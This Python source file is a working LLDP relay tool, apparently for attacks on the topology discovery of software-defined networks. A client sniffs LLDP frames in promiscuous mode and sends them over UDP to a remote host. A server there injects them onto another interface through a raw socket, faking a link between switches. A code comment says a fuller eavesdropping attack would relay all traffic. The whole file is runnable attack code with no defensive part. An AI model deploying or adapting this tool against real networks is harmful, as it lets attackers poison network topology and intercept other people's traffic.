import pcap
import time
import socket 
from optparse import OptionParser

class LLDPRelayClient(object):
    '''
    bind_iface: the binding interface to sniff LLDP packets.
    relay_ends: relay the LLDP to the ends through UDP sockets. 
    '''
    def __init__(self, bind_iface, relay_addr):
        self.bind_iface = bind_iface 
        self.relay_addr = relay_addr
        self.relay_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def _init_pcap(self):
       return pcap.pcap(self.bind_iface, promisc=True, immediate=True, timeout_ms=50)

    # Since we only focus on LLDP packets, thus ignore other packets here.
    # In reality, to further raise eavesdropping attack, all the packets should 
    # be forwarded (relayed). However, the function can be realized in other modules.
    def _filter_lldp(self, pcap_handler):
        pcap_handler.setfilter('ether proto 0x88cc')
    
    def _loop_capture(self, pcap_handler):
        for ptime, pdata in pcap_handler:
            self.relay_sock.sendto(pdata, self.relay_addr)
            delta_time = time.time() - ptime 
            print(f'capturing delay {delta_time}')

    def run(self):
        try:
            pcap_handler = self._init_pcap()
            self._filter_lldp(pcap_handler)
            self._loop_capture(pcap_handler)
        except KeyboardInterrupt:
            return 

class LLDPRelayServer(object):
    '''
    bind_addr: the binding socket address to recv LLDP packets. 
        say, ('192.168.1.1', 8080)
    relay_iface: relay the LLDP to the switch through pcap. 
    '''
    def __init__(self, bind_addr, bind_iface):
        self.bind_addr = bind_addr
        self.bind_iface = bind_iface
        self.recv_sock = self._init_recv_sock()
        self.send_sock = self._init_send_sock()
        
    def _init_recv_sock(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(self.bind_addr)
        except socket.error as e:
            print(e)
            return None 
        else:
            print('[+] recv sock is successfully initialized.')
            return sock

    def _init_send_sock(self):
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            sock.bind((self.bind_iface, 0))
        except socket.error as e:
            print(e)
            return None 
        else:
            print('[+] send sock is successfully initialized.')
            return sock

    def _process(self):
        recv_data, recv_addr = self.recv_sock.recvfrom(65535)
        recv_size = len(recv_data)
        print(f'recved from {recv_addr}: {recv_size} bytes.')
        self.send_sock.send(recv_data)

    def run(self):
        is_init_ok = self.send_sock and self.recv_sock
        is_stop = False if is_init_ok else True 
        while not is_stop:
            try:
                self._process()
            except KeyboardInterrupt as e:
                is_stop = True 
                print(e)
            except socket.error as e:
                is_stop = True 
                print(e)
        
if __name__ == '__main__':
    prompt = '''usage: %prog -t [c|s] -i iface -a ip -p port.'''
    parser = OptionParser(usage=prompt)
    parser.add_option('-t', '--type', dest='type')
    parser.add_option('-i', '--iface', dest='iface')
    parser.add_option('-a', '--addr', dest='addr', default='0.0.0.0')
    parser.add_option('-p', '--port', dest='port', type="int")
    (options, args) = parser.parse_args()

    app_type = options.type.upper()
    if app_type == 'C':
        client = LLDPRelayClient(
            options.iface,
            (options.addr, options.port))
        client.run()
    elif app_type == 'S':
        server = LLDPRelayServer(
            (options.addr, options.port), 
            options.iface)
        server.run()
    else:
        print(parser.usage)

